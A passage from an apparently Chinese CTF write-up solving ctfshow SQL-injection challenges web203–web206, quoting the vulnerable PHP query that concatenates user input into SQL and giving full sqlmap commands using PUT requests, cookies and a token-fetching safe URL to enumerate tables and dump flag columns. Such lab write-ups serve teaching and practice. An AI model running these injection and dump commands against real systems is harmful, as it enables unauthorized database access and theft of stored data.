查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39;;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //代码过于简单，不宜展示
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;默认情况下，sqlmap 发送的是 GET 或 POST 请求。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果目标接口使用 PUT 方法上传数据（比如 &lt;code&gt;REST API&lt;/code&gt;、文件上传接口），需要显式告诉 sqlmap 用 PUT&lt;br&gt;方式发送请求，且 sqlmap 是对具体的 Web 接口 URL 进行测试，因此需要此题需要 &lt;code&gt;index.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PUT 请求不像传统 POST 表单，它需要指定 &lt;code&gt;Content-Type&lt;/code&gt;，告诉服务器数据类型。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;如果接口接收 原始文本&amp;#x2F; &lt;code&gt;JSON&lt;/code&gt; &amp;#x2F;表单，&lt;code&gt;Content-Type&lt;/code&gt; 不匹配，服务器可能直接拒绝请求或报错。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;&lt;code&gt;text/plain&lt;/code&gt; 是告诉服务器：“这是普通文本”，便于 sqlmap 发送参数进行注入测试。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://9b26b5a1-7edd-4d21-869d-032e10b3d35e.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; -D ctfshow_web -T ctfshow_user -C pass --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827160037159.png&#34; alt=&#34;image-20250827160037159&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web204&#34;&gt;&lt;a href=&#34;#web204&#34; class=&#34;headerlink&#34; title=&#34;web204&#34;&gt;&lt;/a&gt;web204&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt; 使用--cookie 提交cookie数据


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where username !=&amp;#39;flag&amp;#39; and id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39;;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //代码过于简单，不宜展示
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://b44a070a-0b0b-4a05-a700-108acfd2ebf6.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; -D ctfshow_web -T ctfshow_user -C pass --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827161433716.png&#34; alt=&#34;image-20250827161433716&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web205&#34;&gt;&lt;a href=&#34;#web205&#34; class=&#34;headerlink&#34; title=&#34;web205&#34;&gt;&lt;/a&gt;web205&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt; api调用需要鉴权


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,password from ctfshow_user where id = &amp;#39;&amp;quot;.$_GET[&amp;#39;id&amp;#39;].&amp;quot;&amp;#39;;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //代码过于简单，不宜展示
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每次请求&lt;code&gt;/api&lt;/code&gt; 之前会去请求一次 &lt;code&gt;getToken.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827163958594.png&#34; alt=&#34;image-20250827163958594&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827163456355.png&#34; alt=&#34;image-20250827163456355&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap提供了以下两个参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--safe-url&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作用：提供一个安全、不会出错的URL，sqlmap会在测试注入之前访问这个URL，确保数据库和网站状态正常&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--safe-freq&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;作用：控制 每次注入测试前访问安全 URL 的次数。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;默认值：通常为 1&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;添加 &lt;code&gt;--safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot;&lt;/code&gt; 和  &lt;code&gt;--safe-freq=1&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --dbs
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170121468.png&#34; alt=&#34;image-20250827170121468&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web --tables
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170710461.png&#34; alt=&#34;image-20250827170710461&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --columns
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170742936.png&#34; alt=&#34;image-20250827170742936&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flax -C flagx --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827170852040.png&#34; alt=&#34;image-20250827170852040&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web206&#34;&gt;&lt;a href=&#34;#web206&#34; class=&#34;headerlink&#34; title=&#34;web206&#34;&gt;&lt;/a&gt;web206&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt; sql需要闭合


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39;) limit 0,1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   //代码过于简单，不宜展示
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sqlmap会自己判断闭合&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web --tables
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827173631683.png&#34; alt=&#34;image-20250827173631683&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc --columns
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827173708626.png&#34; alt=&#34;image-20250827173708626&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827173839584.png&#34; alt=&#34;image-20250827173839584&#34; style=&#34;zoom: 25%;&#34; /&gt;

